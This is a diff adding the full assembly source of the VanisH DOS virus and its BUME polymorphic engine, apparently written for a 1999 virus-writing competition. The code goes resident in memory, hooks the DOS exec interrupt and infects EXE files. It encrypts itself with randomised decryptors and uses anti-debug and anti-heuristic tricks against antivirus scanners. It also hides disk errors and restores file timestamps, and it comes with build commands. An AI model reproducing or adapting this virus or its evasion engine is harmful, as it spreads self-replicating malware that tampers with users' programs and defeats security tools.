@@ -1,0 +1,1078 @@
+; vanish.asm - begin -------------------------------------------------------
+;
+;   VanisH virus with [BUME]
+;   by Bumblebee for VirusBuster's polymorphic engine competition.
+;
+;   . Hi all! This is a simple resident EXE infector. No full stealth or
+;   new stuff -i think-. I wrote it only as demo of BUME: Bumblebee Ultimate
+;   Mutator Engine.
+;
+;   . Description:
+;
+;       .. When a infected file execs, VanisH goes resident with a
+;       MCB loop and traps int21h exec. Then if a DOS EXE is exec
+;       the virus infects it. It doesn't infect files with overlays,
+;       Win EXEs and files smaller than 5000 bytes.
+;       .. A nice payload with 80x25 text mode -VanisH!-.
+;       .. Encrypted with 2 layers -only 1st with BUME-.
+;       .. Includes anti-heuristic, anti-trace and anti-debug stuff.
+;       .. Has some basic stealth -see I/O errors, time and date-.
+;
+;   . To Compile:
+;
+;       tasm /m3 vanish.asm
+;       tlink vanish.obj
+;       exe2bin vanish.exe vanish.com
+;
+
+virus segment byte public
+                assume cs:virus, ds:virus
+                org 0h
+
+virusStart      label   byte
+virusSize       equ     virusEnd-virusStart
+virusMem        equ     (((virusSize*2)/10h)+1)+((215/10h)+1)
+cryptSize       equ     endBody-beginBody
+
+inicio:
+        call    crypt
+
+beginBody:                                      ; here begins encrypted code
+        push    bx                              ; anti-trace trick
+        pop     bx                              ; fools some avs
+        sub     sp,2                            ; like tbav
+        pop     dx
+        cmp     bx,dx
+        je      skipDummyGoOut
+
+        mov     ah,4ch
+        int     21h
+
+skipDummyGoOut:
+        call    delta    
+delta:
+        mov     di,sp                   ; some anti-h to get delta offset
+        mov     bp,word ptr ss:[di]
+        sub     bp,offset delta
+        add     sp,2
+
+        mov     di,(offset endBody-offset layer2)/2
+        lea     cx,layer2+bp
+        xchg    cx,di                           ; anti-h
+cloop2:
+        db      2eh,81h,35h                     ; xor word ptr cs:[di],??
+key2    dw      0h                              ; hardcoded
+        add     di,2                            ; this is the 2nd decryptor
+        int     3h                              ; layer
+        loop    cloop2
+
+layer2:                                         ; begin of second layer
+        mov     ah,30h                          ; residence check
+        mov     di,'Vn'
+        mov     si,'sH'
+        int     21h                             ; VnsH ?
+        cmp     di,'He'
+        jne     install
+        cmp     si,'re'                         ; Here !
+        jne     install
+
+        mov     ch,2ah                          ; get date
+        xchg    ah,ch
+        int     21h
+
+        cmp     al,0                            ; check for payload
+        jne     jmpHost                         ; activation
+
+        cmp     dl,5
+        jne     jmpHost
+
+        call    payload                         ; VanisH screen!
+
+jmpHost:
+
+        pop     ax                              ; pop EXE regs
+        pop     es                              ; pushed by BUME
+        pop     ds                              ; decryptor
+
+        mov     si,es
+        add     si,10h
+        add     word ptr cs:[host_csip+bp+02h],si
+
+        cli
+        mov     sp,word ptr cs:[host_sssp+bp+02h]
+        add     si,word ptr cs:[host_sssp+bp]
+        mov     ss,si
+        sti
+
+        xor     dx,dx
+        push    word ptr cs:[host_csip+bp+02h]
+        push    word ptr cs:[host_csip+bp]
+        retf                                    ; jump to host
+
+host_csip       dw      0000h,0000h
+host_sssp       dd      ?
+
+install:                                        ; classic MCB mem install
+        mov     al,52h                          ; take 1st MCB w anti-h
+        xchg    ah,al
+        int     21h
+        mov     si,word ptr es:[bx-2]
+        mov     es,si
+
+        xor     di,di
+nextMCB:                                        ; MCB loop
+        cmp     byte ptr es:[di],'Z'            ; last ?
+        je      installNow
+        add     si,word ptr es:[di+3]           ; add paras
+        inc     si                              ; add MCB
+        mov     es,si
+        jmp     nextMCB
+
+installNow:                                     ; there is space for a virus?
+        cmp     word ptr es:[di+3],virusMem+1
+        jb      jmpHost
+
+        mov     byte ptr es:[di],'M'            ; now isn't last
+
+        sub     word ptr es:[di+3],virusMem+1
+        add     si,word ptr es:[di+3]
+
+        inc     si
+
+        mov     es,si
+        mov     byte ptr es:[di],'Z'            ; mark as Z
+        mov     word ptr es:[di+1],08h          ; DOS memory
+        mov     word ptr es:[di+3],virusMem
+        mov     word ptr es:[di+8],4f44h
+        mov     word ptr es:[di+0ah],0053h      ; owned by DOS
+        inc     si
+
+        cld                                     ; copy virus into mem
+        push    cs
+        pop     ds
+        mov     ax,si
+        mov     es,ax
+        xor     di,di
+        mov     cx,virusSize
+        mov     si,bp
+        rep     movsb
+
+        mov     ds,cx                           ; hook DOS int
+        mov     es,ax
+        mov     si,21h*4h
+        lea     di,oldInt21+1
+        movsw
+        movsw
+
+        mov     word ptr ds:[si-4],offset newInt21
+        mov     word ptr ds:[si-2],ax
+
+        jmp     jmpHost
+
+newInt21:                                       ; more anti-h to
+        xchg    ax,cx                           ; monitor int 21h
+        cmp     ch,30h
+        jne     next0
+        cmp     di,'Vn'
+        jne     next0
+        cmp     si,'sH'
+        jne     next0
+        mov     di,'He'                         ; i'm Here to kill you!
+        mov     si,'re'
+        iret
+next0:
+        cmp     ch,4bh
+        xchg    ax,cx
+        je      trap
+oldInt21:
+        db      0eah
+        dw      ?,?
+
+trap:
+        push    ax bx cx dx di si es ds         ; push all this
+        pushf                                   ; and flags
+
+        call    set_int_24h                     ; set I/O stealth
+
+        call    check_file                      ; check file
+        jc      pop_go_out                      ; fast go to old int 21h
+        call    infect                          ; infect file
+
+pop_go_out:
+
+        call    reset_int_24h                   ; quit I/O stealth
+
+        popf                                    ; pop flags
+        pop     ds es si di dx cx bx ax         ; pop all
+        jmp     oldInt21                        ; go old int 21h
+
+check_file:                                     ; this proc checks
+                                                ; if this is a valid file
+        mov     ax,3d02h                        ; try to open
+        int     21h
+        jnc     check1
+
+        add     sp,2                            ; fast go out!
+        jmp     pop_go_out
+
+check1:
+        mov     bx,ax                           ; save file handle
+
+        mov     cx,5700h                        ; get time and date of file
+        xchg    ax,cx
+        int     21h
+
+        mov     word ptr cs:[date],dx           ; save it
+        mov     word ptr cs:[time],cx
+
+        push    cs
+        pop     ds
+
+        mov     cx,3f00h                        ; more and more anti-H to
+        mov     ax,1dh                          ; read header
+        lea     dx,host_header
+        xchg    cx,ax
+        int     21h
+
+        mov     ax,word ptr cs:[host_header]    ; this file is a EXE?
+        add     ah,al
+        cmp     ah,'M'+'Z'
+        jne     close_n_out                     ; uh?
+        
+        cmp     byte ptr cs:[host_header+18h],40h
+        jz      close_n_out                     ; a windows EXE
+
+        cmp     word ptr cs:[host_header+1ah],00h ; overlays?
+        jne     close_n_out
+
+        cmp     word ptr cs:[host_header+12h],'kh' ; infected yet?
+        jne     check2                             ; this is a common inf
+                                                   ; sign in my viruses
+
+close_n_out:
+        mov     cx,5701h                        ; restores time and date
+        mov     ax,word ptr cs:[time]
+        mov     dx,word ptr cs:[date]
+        xchg    ax,cx
+        int     21h
+
+        mov     ah,3eh                          ; close the file
+        int     21h
+
+        stc                     ; sets carry flag -> this file isn't valid
+        ret
+check2:
+        mov     cx,4202h                        ; move to end of file
+        xor     ax,ax
+        mov     dx,ax
+        xchg    ax,cx
+        int     21h
+
+        mov     word ptr cs:[sh],dx             ; save size
+        mov     word ptr cs:[sl],ax
+
+        cmp     dx,00h
+        jne     end_check
+
+        cmp     ax,5000
+        jna     close_n_out                     ; test if is bigger than
+                                                ; 5000 bytes
+end_check:
+        clc                                     ; clear carry -> a valid file
+        ret
+
+include bume.asm                                ; include here [BUME]
+
+infect:                                         ; proc to infect files
+        cld                                     ; sure it can be improved ;)
+        mov     dx,word ptr cs:[sh]
+        mov     ax,word ptr cs:[sl]
+
+        push    cs
+        pop     es
+        push    cs
+        pop     ds
+
+        lea     si,host_header
+        add     si,0eh
+        lea     di,host_sssp
+        movsw
+        movsw                                   ; saves sssp
+
+        add     si,2
+        lea     di,host_csip                    ; and saves csip
+        movsw
+        movsw
+
+        push    ax
+        pop     si
+        shr     ax,4
+        shl     dx,12
+        add     dx,ax
+        sub     dx,word ptr cs:[host_header+08h]   ; sub header size
+
+        and     si,0fh
+        mov     word ptr cs:[host_header+16h],dx
+        mov     word ptr cs:[host_header+14h],si
+
+        mov     ax,dx                           ; this is 'cause tbav
+        and     ax,01h                          ; sets a flag if stack
+        jz      ispar                           ; isn't par
+        inc     dx
+
+ispar:
+        add     dx,2
+        mov     word ptr cs:[host_header+0eh],dx
+        mov     word ptr cs:[host_header+10h],((virusSize+100h)/02h)*02h
+
+        mov     dx,word ptr cs:[sh]
+        mov     ax,word ptr cs:[sl]
+
+        add     word ptr cs:[host_header+0ah],virusMem
+        mov     word ptr cs:[host_header+12h],'kh' ; infection sign
+
+        push    cs
+        pop     ds
+        push    ax dx bx
+        xor     dx,dx
+        mov     cx,10h
+        div     cx
+        lea     si,beginBody
+        add     si,dx                           ; si: begin of encrypted
+       ;dec     si                              ; code with delta offset
+        push    cs                              ; added
+        pop     es
+        lea     di,crypt
+        add     di,virusSize
+otherk:
+        mov     ah,0ffh
+        call    rnd
+        or      al,al
+        jz      otherk
+        mov     byte ptr cs:[key],al
+        mov     cx,cryptSize
+        call    bume
+        pop     bx dx ax
+
+        push    cx
+        add     cx,virusSize
+        add     ax,cx
+        adc     dx,00h
+
+        mov     cx,200h
+        div     cx
+        cmp     dx,00h
+        je      noinc
+        inc     ax
+
+noinc:
+        mov     word ptr cs:[host_header+02h],dx
+        mov     word ptr cs:[host_header+04h],ax
+
+        push    cs
+        pop     ds
+        push    cs
+        pop     es
+        mov     cx,virusSize
+        lea     si,virusStart
+        lea     di,virusEnd
+        rep     movsb
+
+        lea     si,layer2
+        add     si,offset virusEnd
+        mov     cx,(offset endBody-offset layer2)/2
+otherc1:
+        in      ax,40h
+        or      ax,ax
+        jz      otherc1
+        cmp     ah,al
+        je      otherc1
+ecloop0:
+        xor     word ptr cs:[si],ax
+        add     si,2
+        loop    ecloop0
+        lea     si,virusEnd
+        add     si,offset key2
+        mov     word ptr cs:[si],ax
+
+        push    cs
+        pop     ds
+        lea     si,beginBody
+        add     si,offset virusEnd
+        mov     cx,cryptSize
+        mov     al,byte ptr cs:[key]
+ecloop:
+        xor     byte ptr ds:[si],al
+        inc     si
+        loop    ecloop
+
+        pop     cx
+        mov     ax,virusSize
+        add     ax,cx
+        mov     cx,4000h        ; write virus
+        lea     dx,virusEnd
+        xchg    cx,ax
+        int     21h
+
+        mov     cx,4200h                ; move to beginig
+        xor     ax,ax
+        mov     dx,ax
+        xchg    ax,cx
+        int     21h
+
+        mov     cx,4000h                ; write header
+        mov     ax,1dh
+        xchg    ax,cx
+        lea     dx,host_header
+        int     21h
+
+        mov     cx,5701h                ; restores time and date
+        mov     ax,word ptr cs:[time]
+        mov     dx,word ptr cs:[date]
+        xchg    ax,cx
+        int     21h
+
+        mov     ah,3eh                  ; close and next!
+        int     21h
+
+        ret
+
+; some data for EXE infection
+host_header     db      1dh dup(?)              ; EXE header
+time            dw      ?                       ; save time
+date            dw      ?                       ; save date
+sh              dw      ?                       ; size high
+sl              dw      ?                       ; size low
+key             db      0                       ; tmp crypt key
+
+set_int_24h:    push    ax si di                ; hook dos error handler
+                push    ds es                   ; a classic procedure
+
+                xor     ax,ax
+                mov     ds,ax
+
+                push    cs
+                pop     es
+
+                mov     si,24h*4h
+                lea     di,old_int_24h
+                cld
+                movsw
+                movsw
+
+                lea     di,new_int_24h
+                mov     word ptr [si-4],di
+                mov     word ptr [si-2],cs
+
+                pop     es ds
+                pop     di si ax
+                ret
+
+reset_int_24h:  push    ax si di                ; restore old int 24h
+                push    ds es                   ; a classic procedure
+
+                xor     ax,ax
+                mov     es,ax
+
+                push    cs
+                pop     ds
+
+                lea     si,old_int_24h
+                mov     di,24h*4
+                cld
+                movsw
+                movsw
+
+                pop     es ds
+                pop     di si ax
+                ret
+
+new_int_24h:    mov     al,0                    ; new int 24h
+                iret
+
+old_int_24h:    dw      ?,?                     ; save here old int 24h
+                                                ; to restore after infection
+
+payload:                                        ; here is the payload
+
+        mov     ah,01
+        mov     cx,2000h
+        int     10h
+
+        xor     bp,bp
+mainl:
+        xor     si,si
+loopy:
+        xor     di,di
+loopx:
+
+        xor     bx,bx
+        mov     ax,di
+        mov     dl,al
+        mov     ax,si
+        mov     dh,al
+        mov     ah,02h
+        int     10h
+
+        mov     ah,08h
+        int     10h
+
+        cmp     al,' '
+        je      vskip
+
+        mov     bl,ah
+        dec     al
+        mov     ah,09h
+        mov     cx,1
+        int     10h
+
+vskip:
+        inc     di
+        cmp     di,79
+        jne     loopx
+
+        inc     si
+        cmp     si,24
+        jne     loopy
+
+        inc     bp
+        cmp     bp,256
+        jne     mainl
+
+        mov     ah,01
+        mov     cx,0d0eh
+        int     10h
+
+        mov     ax,4c00h
+        int     21h
+
+infLoop:
+        jmp     infLoop
+
+; some data
+                db      0dh,0ah
+vId             db      '[VanisH]'              ; id of virus
+author          db      '[Coded by Bumblebee]'  ; author of virus
+message         db      0dh,0ah,0dh,0ah         ; a nice message
+                db      'Kill their servants',0dh,0ah
+                db      'Burn their homes',0dh,0ah
+                db      'Till there''s no blood left to spill',0dh,0ah
+                db      'Hail and Kill',0dh,0ah
+                db      0dh,0ah
+                                                ; here ends 2nd layer
+endBody:                                        ; here ends encrypted code
+
+crypt:                                          ; here will go decryptor
+                                                ; generated by BUME in
+                                                ; 2nd generation and so
+virusEnd        label   byte
+
+;
+;       carrier
+;
+        pop     bp                              ; pop ip of ret
+        push    ds                              ; push EXE regs
+        push    es
+        push    ax
+        push    bp                              ; restore ip of ret
+
+        push    cs                              ; set host_csip to jump
+        pop     ax                              ; exit code of carrier
+        sub     ax,10h
+        push    si
+        mov     si,es
+        sub     ax,si
+        pop     si
+        mov     word ptr cs:[host_csip+102h],ax
+        lea     ax,exit+100h
+        mov     word ptr cs:[host_csip+100h],ax
+        ret
+
+exit:                                           ; exit code of carrier
+        push    cs
+        pop     ds
+        mov     ah,09h
+        lea     dx,cmessage+100h
+        int     21h                             ; display some WARNING
+
+        mov     ax,4c00h
+        int     21h
+
+; carrier data
+cmessage        db      'WARNING - This is the [VanisH] carrier - WARNING'
+                db      0dh,0ah,'             - Coded by Bumblebee -'
+                db      0dh,0ah,'$'
+
+
+virus           ends
+                end     inicio
+
+; vanish.asm - end ---------------------------------------------------------
+
+; bume.asm - begin ---------------------------------------------------------
+;
+;  Bumblebee Ultimate Mutator Engine [BUME]
+;  for EXE infectors (and works fine with COM infectors)
+;
+;  . I worte it for VirusBuster's polymorphic engine competition. HKPE
+;  is small and crypt algo is better. But BUME includes some anti-debug
+;  in the generated procs and also includes some push's for EXE infectors.
+;
+;  . Some helloz...
+;
+;       Wintermute: vuelve a la escena o... learn C++ and code your game!
+;          Darkman: dos cervezas por favor ;)
+;          Pharmie: hi grandma!
+;             Lich: ¨que le parece este engine?
+;     Virus Buster: Anuncia mas tus competitions, que la gente no se entera
+;
+;   ... and all my people in #vir and #virus.
+;
+;  Proc generated looks like:
+;
+;       ?i                      -> di or si (random)
+;       ?l                      -> al or bl or dl (random)
+;       ?? <opcode> ??          -> opcode may be here (or not)
+;       { garbage }             -> garbage opcodes (random opcodes and size)
+;       { antidebug }           -> anti-debug opcodes (random)
+;
+; Proc begins here:
+;
+;       { garbage }
+;       { antidebug }
+;       { garbage }
+;       ?? <mov cx,size_to_crypt> ??
+;       ?? <mov ?i,offset_of_ccode> ??
+;       pop     bp
+;       { garbage }
+;       ?? <mov cx,size_to_crypt> ??
+;       ?? <mov ?i,offset_of_ccode> ??
+;       push    ds
+;       { garbage }
+;       ?? <mov cx,size_to_crypt> ??
+;       ?? <mov ?i,offset_of_ccode> ??
+;       push    es
+;       { garbage }
+;       ?? <mov cx,size_to_crypt> ??
+;       ?? <mov ?i,offset_of_ccode> ??
+;       push    ax
+;       { garbage }
+;       ?? <mov cx,size_to_crypt> ??
+;       ?? <mov ?i,offset_of_ccode> ??
+;       push    bp
+;       { garbage }
+;       ?? <mov cx,size_to_crypt> ??
+;       ?? <mov ?i,offset_of_ccode> ??
+;       push    cs
+;       { garbage }
+;       ?? <mov cx,size_to_crypt> ??
+;       ?? <mov ?i,offset_of_ccode> ??
+;       pop     ds
+;       { garbage }
+;       ?? <mov cx,size_to_crypt> ??
+;       ?? <mov ?i,offset_of_ccode> ??
+;       push    ax
+;       { garbage }
+;       ?? <mov cx,size_to_crypt> ??
+;       ?? <mov ?i,offset_of_ccode> ??
+;       push    bx
+;       { garbage }
+;       ?? <mov cx,size_to_crypt> ??
+;       ?? <mov ?i,offset_of_ccode> ??
+;       push    dx
+;       ?? <mov cx,size_to_crypt> ??
+;       ?? <mov ?i,offset_of_ccode> ??
+; cloop:
+;       { garbage }
+;       { antidebug }
+;       mov     ?l,crypt_key
+;       { garbage }
+;       xor     byte ptr ds:[?i]
+;       { garbage }
+;       inc     ?i
+;       { antidebug }
+;       loop    cloop
+;       { garbage }
+;       pop     dx
+;       { garbage }
+;       pop     bx
+;       { garbage }
+;       pop     ax
+;       ret
+;
+; Proc ends here.
+;
+;               BUME size is: 517 bytes
+; max size of generated proc: 215 bytes
+;
+; begin of BUME ------------------------------------------------------------
+;
+;  BUME - Bumblebee Ultimate Mutator Engine (what a name!)
+;
+;  in:
+;       es:di   where to put generated proc
+;       cx      size to encrypt/decrypt
+;       si      offset of code to encrypt/decript
+;       al      encrypt/decrypt key
+;  out:
+;       cx      size of generated proc
+;
+bume:
+        mov     word ptr cs:[bpass1+1],cx
+        mov     word ptr cs:[bpass2+2],si
+        mov     byte ptr cs:[bpass3+1],al
+        mov     byte ptr cs:[bpass3+3],al
+        mov     byte ptr cs:[bpass3+5],al
+
+        xor     cx,cx                   ; size of proc begins from 0
+
+        mov     byte ptr cs:[cflag],ch
+        mov     byte ptr cs:[sflag],ch
+
+
+        push    cs
+        pop     ds
+        lea     si,bpass0
+        xor     dx,dx
+        mov     dl,10
+
+        call    insShit
+        call    insADebug
+bloop0:
+        call    insShit
+
+        cmp     byte ptr cs:[cflag],1   ; ?? <mov cx,size_to_crypt> ??
+        je      bskip0
+
+        mov     ah,1
+        call    rnd
+        or      al,al
+        jz      bskip0
+
+        mov     byte ptr cs:[cflag],al
+        push    ds si
+        lea     si,bpass1
+        movsb
+        movsw
+        add     cx,3
+        pop     si ds
+bskip0:
+
+        cmp     byte ptr cs:[sflag],1   ; ?? <mov ?i,offset_of_ccode> ??
+        je      bskip1
+
+        mov     ah,1
+        call    rnd
+        or      al,al
+        jz      bskip1
+
+        mov     byte ptr cs:[sflag],al
+
+        mov     ah,1
+        call    rnd
+        mov     byte ptr cs:[iflag],al
+
+        push    ds si
+        lea     si,bpass2
+        add     si,ax
+        movsb
+        or      al,al
+        jnz     bskip3
+        inc     si
+bskip3:
+        movsw
+        add     cx,3
+        pop     si ds
+
+bskip1:
+        movsb
+        inc     cx
+        dec     dl
+        jnz     bloop0
+
+        cmp     byte ptr cs:[cflag],0
+        jne     bskip4
+
+        push    ds si
+        lea     si,bpass1
+        movsb
+        movsw
+        add     cx,3
+        pop     si ds
+
+bskip4:
+        cmp     byte ptr cs:[sflag],0
+        jne     bskip5
+
+        mov     ah,1
+        call    rnd
+        mov     byte ptr cs:[iflag],al
+
+        push    ds si
+        lea     si,bpass2
+        add     si,ax
+        movsb
+        or      al,al
+        jnz     bskip6
+        inc     si
+bskip6:
+        movsw
+        add     cx,3
+        pop     si ds
+
+bskip5:
+        push    cx                      ; save this pos for later loop
+
+        mov     ah,3
+        call    rnd
+        mov     word ptr [regflag],ax
+
+        lea     si,bpass3
+        push    cx
+        mov     cl,2
+        mul     cl
+        pop     cx
+        add     si,ax
+
+        call    insShit
+        call    insADebug
+        movsw
+        add     si,4
+        add     cx,2
+
+        cmp     byte ptr cs:[iflag],1
+        je      bskip7
+
+        add     si,6
+bskip7:
+        call    insShit
+        movsw
+        add     cx,2
+
+        call    insShit
+        lea     si,bpass6
+        xor     ax,ax
+        mov     al,byte ptr cs:[iflag]
+        add     si,ax
+        movsb
+        inc     cx
+
+        call    insADebug
+
+        mov     al,0e2h
+        mov     ah,0feh
+        pop     bx
+        mov     dx,cx
+        sub     dx,bx
+        sub     ah,dl
+        mov     word ptr es:[di],ax
+        add     cx,2
+        add     di,2
+
+        push    cs
+        pop     ds
+        lea     si,bpass7
+        xor     dx,dx
+        mov     dl,3
+
+bloop1:
+        call    insShit
+
+        movsb
+        inc     cx
+        dec     dl
+        jnz     bloop1
+
+        mov     byte ptr es:[di],0c3h   ; insert ret
+        inc     cx
+
+        ret
+
+; BUME data -don't touch this!-
+bpass0  db      5dh,1eh,06h,50h,55h,0eh,1fh,50h,53h,52h
+bpass1  db      0b9h
+        dw      0
+bpass2  db      0beh,0bfh
+        dw      0
+bpass3  db      0b0h,0,0b3h,0,0b2h,0
+bpass4  db      30h,05h,30h,1dh,30h,15h
+bpass5  db      30h,04h,30h,1ch,30h,14h
+bpass6  db      46h,47h,5bh,42h,55h,4dh,45h,5dh
+bpass7  db      5ah,5bh,58h
+bshit0  db      50h,48h,33h,0c0h,23h,0c0h,0bh,0c0h,40h,58h ; ax
+bshit1  db      53h,43h,23h,0dbh,33h,0dbh,0bh,0dbh,4bh,5bh ; bx
+bshit3  db      52h,4ah,33h,0d2h,0bh,0d2h,23h,0d2h,42h,5ah ; dx
+bshit4  db      51h,49h,33h,0c9h,0bh,0c9h,23h,0c9h,41h,59h ; cx
+bdebu0  db      16h,17h,0cch
+bdebu1  db      16h,83h,0c4h,02h,0cch
+iflag   db      0
+sflag   db      0
+cflag   db      0
+regflag dw      0
+
+;
+; insADebug - puts anti-debug stuff on ds:si
+;
+insADebug:
+        cld
+        push    ds si
+
+        mov     ah,1
+        call    rnd
+
+        push    cs
+        pop     ds
+        or      al,al
+        jz      insAD0
+
+        lea     si,bdebu1
+        push    cx
+        mov     cx,5
+        rep     movsb
+        pop     cx
+        add     cx,5
+        jmp     insADOut
+
+insAD0:
+        lea     si,bdebu0
+        movsb
+        movsw
+        add     cx,3
+
+insADOut:
+        pop     si ds
+        ret
+
+;
+; insShit - puts garbage instructions on ds:si
+;
+insShit:
+        cld
+        push    bx
+        push    cx ds si
+
+        xor     cx,cx
+        push    cs
+        pop     ds
+        lea     si,bshit0
+        mov     ah,3
+        call    rnd
+        mov     cl,10
+        mul     cl
+        add     si,ax           ; si -> offset of bshit(n)
+
+        movsw                   ; move push
+
+        mov     ah,3
+        call    rnd
+        cmp     al,0
+        jne     bskipIncAl0
+        inc     al
+bskipIncAl0:
+
+        add     si,6
+        mov     cl,2
+        mul     cl
+        sub     si,ax
+        mov     cx,ax
+
+        mov     bx,cx
+        rep     movsb           ; move garbage
+        movsw                   ; move pop
+
+        pop     si ds cx
+        add     cx,bx
+        add     cx,4
+        pop     bx
+        ret
+
+;
+; rnd - get arandom number from 0 to max random number
+;
+; in:
+;       ah      max random number (and)
+; out:
+;       al      random number
+;
+rnd:
+        in      al,40h
+        and     al,ah
+        xor     ah,ah
+        ret
+
+; end of BUME --------------------------------------------------------------
+; bume.asm - end -----------------------------------------------------------
+
+; payload.asm - begin ------------------------------------------------------
+;
+;       (C) 1999 Bumblebee. All rights reserved ;)
+;
+;       . Payoad wrote to [BUME] demo virus -> VanisH <-
+;       . Uses Ints to work fine in DOS box under Win
+;       . No data destuction, only funny vanish of screen X=]
+;
+;       tasm /m3 payload.asm
+;       tlink /t payload.obj
+;
+payload segment byte public
+                assume cs:payload, ds:payload
+                org 100h
+
+inicio:
+
+        mov     ah,01
+        mov     cx,2000h
+        int     10h
+
+        xor     bp,bp
+mainl:
+        xor     si,si
+loopy:
+        xor     di,di
+loopx:
+
+        xor     bx,bx
+        mov     ax,di
+        mov     dl,al
+        mov     ax,si
+        mov     dh,al
+        mov     ah,02h
+        int     10h
+
+        mov     ah,08h
+        int     10h
+
+        cmp     al,' '
+        je      vskip
+
+        mov     bl,ah
+        dec     al
+        mov     ah,09h
+        mov     cx,1
+        int     10h
+
+vskip:
+        inc     di
+        cmp     di,79
+        jne     loopx
+
+        inc     si
+        cmp     si,24
+        jne     loopy
+
+        inc     bp
+        cmp     bp,256
+        jne     mainl
+
+        mov     ah,01
+        mov     cx,0d0eh
+        int     10h
+
+        mov     ax,4c00h
+        int     21h
+
+payload         ends
+end     inicio
+
+; payload.asm - end --------------------------------------------------------
+
